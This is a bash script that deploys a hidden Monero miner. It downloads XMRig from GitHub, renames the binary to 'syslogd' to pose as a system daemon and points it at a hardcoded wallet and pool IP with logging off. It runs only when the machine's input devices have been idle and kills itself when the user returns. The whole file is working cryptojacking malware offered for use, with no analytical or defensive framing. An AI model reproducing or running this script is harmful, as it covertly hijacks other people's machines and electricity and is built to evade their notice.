#!/bin/bash

### === CONFIGURATION === ###
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="134.199.197.80:443"
WORKER_ID="headless-worker"
CPU_USAGE="90"
FAKE_NAME="syslogd"
IDLE_SECONDS=180
THREADS=$(nproc --all)
MAX_THREADS=$((THREADS * CPU_USAGE / 100))

### === Download & Setup XMRig === ###
wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
cd xmrig-6.24.0 || exit 1

mv xmrig "$FAKE_NAME"

cat > config.json <<EOF
{
  "autosave": true,
  "background": true,
  "cpu": {
    "enabled": true,
    "huge-pages": false,
    "max-threads-hint": $MAX_THREADS,
    "priority": 0
  },
  "donate-level": 0,
  "log-file": null,
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "Genzi",
      "keepalive": true,
      "tls": false
    }
  ],
  "print-time": 60,
  "syslog": false,
  "user-agent": "curl/7.68.0"
}
EOF

### === Headless Idle Check Function === ###
get_idle_seconds() {
  last_input=$(find /dev/input -type c 2>/dev/null | xargs -r stat -c "%X" 2>/dev/null | sort -nr | head -n1)
  now=$(date +%s)
  idle=$(( now - last_input ))
  echo $idle
}

### === Start Miner Loop === ###
while true; do
  idle=$(get_idle_seconds)
  if [ "$idle" -ge "$IDLE_SECONDS" ]; then
    if ! pgrep -f "./$FAKE_NAME" >/dev/null; then
      echo "[+] System idle. Starting miner..."
      nohup ./"$FAKE_NAME" --config=config.json >/dev/null 2>&1 &
    fi
  else
    if pgrep -f "./$FAKE_NAME" >/dev/null; then
      echo "[-] System active. Suspending miner..."
      pkill -f "./$FAKE_NAME"
    fi
  fi
  sleep 30
done
